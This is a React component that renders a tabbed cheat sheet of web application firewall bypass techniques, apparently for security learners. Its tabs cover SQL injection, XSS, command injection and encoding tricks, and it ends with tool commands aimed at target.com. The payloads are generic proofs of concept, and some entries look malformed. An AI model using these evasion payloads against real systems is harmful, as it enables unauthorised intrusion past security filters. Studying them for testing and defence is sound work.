
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Shield, Code, AlertTriangle, Zap } from 'lucide-react';

const WAFBypass: React.FC = () => {
  return (
    <Card className="bg-cybr-card border-cybr-muted">
      <CardHeader>
        <CardTitle className="text-cybr-primary flex items-center gap-2">
          <Shield className="h-6 w-6" />
          WAF Bypass Techniques
        </CardTitle>
      </CardHeader>
      <CardContent>
        <Tabs defaultValue="sql-injection" className="w-full">
          <TabsList className="grid grid-cols-2 md:grid-cols-4 w-full mb-6">
            <TabsTrigger value="sql-injection">SQL Injection</TabsTrigger>
            <TabsTrigger value="xss-bypass">XSS Bypass</TabsTrigger>
            <TabsTrigger value="command-injection">Command Injection</TabsTrigger>
            <TabsTrigger value="encoding-techniques">Encoding</TabsTrigger>
          </TabsList>

          <TabsContent value="sql-injection" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">SQL Injection WAF Bypass</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Comment-Based Bypass</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# MySQL Comment Bypass
' UNION/**/SELECT/**/1,2,3--
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
'/**/UNION/**/SELECT/**/1,2,3/**/FROM/**/users--

# Multi-line Comments
'/*
*/UNION/*
*/SELECT/*
*/1,2,3--

# Nested Comments
'/*!/**/UNION/**/SELECT/**/1,2,3--*/--`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Case Manipulation</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Mixed Case
' UnIoN sElEcT 1,2,3--
' uNiOn SeLeCt 1,2,3--

# Alternating Case
' uNiOn aLl SeLeCt 1,2,3--
' UnIoN aLl SeLeCt 1,version(),3--`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Space Replacement</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Tab Character
'%09UNION%09SELECT%091,2,3--

# Multiple Spaces
'%20%20UNION%20%20SELECT%20%201,2,3--

# Line Feed
'%0aUNION%0aSELECT%0a1,2,3--

# Carriage Return
'%0dUNION%0dSELECT%0d1,2,3--

# Form Feed
'%0cUNION%0cSELECT%0c1,2,3--`}
                </pre>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="xss-bypass" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">XSS WAF Bypass Techniques</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Event Handler Variations</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Case Variations
<img src=x onerror=alert(1)>
<img src=x OnError=alert(1)>
<img src=x ONERROR=alert(1)>

# Mixed Case Events
<svg OnLoad=alert(1)>
<body OnLoad=alert(1)>
<iframe OnLoad=alert(1)>

# Alternative Events
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">String Concatenation</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# JavaScript String Concat
<script>alert('XS'+'S')</script>
<script>alert('XS'.concat('S'))</script>
<script>alert(\`XSS\`)</script>

# Unicode Escape
<script>alert('\\u0058\\u0053\\u0053')</script>
<script>alert(String.fromCharCode(88,83,83))</script>

# Hex Encoding
<script>alert('\\x58\\x53\\x53')</script>`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">HTML Entity Encoding</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Named Entities
&lt;script&gt;alert(1)&lt;/script&gt;

# Numeric Entities
&#60;script&#62;alert(1)&#60;/script&#62;

# Hex Entities
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

# Mixed Encoding
&lt;scr&#105;pt&gt;alert(1)&lt;/scr&#105;pt&gt;`}
                </pre>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="command-injection" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Command Injection WAF Bypass</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Command Separators</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Multiple Separators
; whoami
| whoami
& whoami
&& whoami
|| whoami
\`whoami\`
$(whoami)

# Encoded Separators
%3B whoami
%7C whoami
%26 whoami`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Variable Expansion</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# IFS (Internal Field Separator)
; who$IFS\$()ami
; who\${IFS}ami
; who$IFS()ami

# Environment Variables
; who\$USER\$HOST\ami
; wh\${PATH:0:1}\oami

# Brace Expansion
; w{h,}o{a,}m{i,}`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Quote Manipulation</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Single Quotes
; w'h'o'a'm'i
; wh''oami

# Double Quotes
; w"h"o"a"m"i
; wh""oami

# Backslash Escaping
; wh\\o\\a\\m\\i
; who\\ami`}
                </pre>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="encoding-techniques" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Advanced Encoding Techniques</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Multiple Encoding Layers</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Double URL Encoding
%253Cscript%253E → %3Cscript%3E → <script>

# Base64 + URL Encoding
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D

# Hex + URL Encoding
%5C%78%33%43%73%63%72%69%70%74%5C%78%33%45`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Character Set Bypasses</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# UTF-8 Overlong Encoding
%C0%BC → <
%C1%9C → \

# UTF-16 Encoding
%u003C → <
%u003E → >

# UTF-7 Encoding
+ADw-script+AD4-alert(1)+ADw-/script+AD4-`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Bypass Tools</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# WAF Bypass Tools
wafninja -u http://target.com/search?q=PAYLOAD
wafw00f http://target.com
wafbypasser -u http://target.com -p "1' OR '1'='1"

# Custom Encoding Scripts
python -c "import urllib.parse; print(urllib.parse.quote_plus('<script>'))"
echo "<script>" | base64
echo "3C736372697074E" | xxd -r -p`}
                </pre>
              </div>
            </div>
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  );
};

export default WAFBypass;
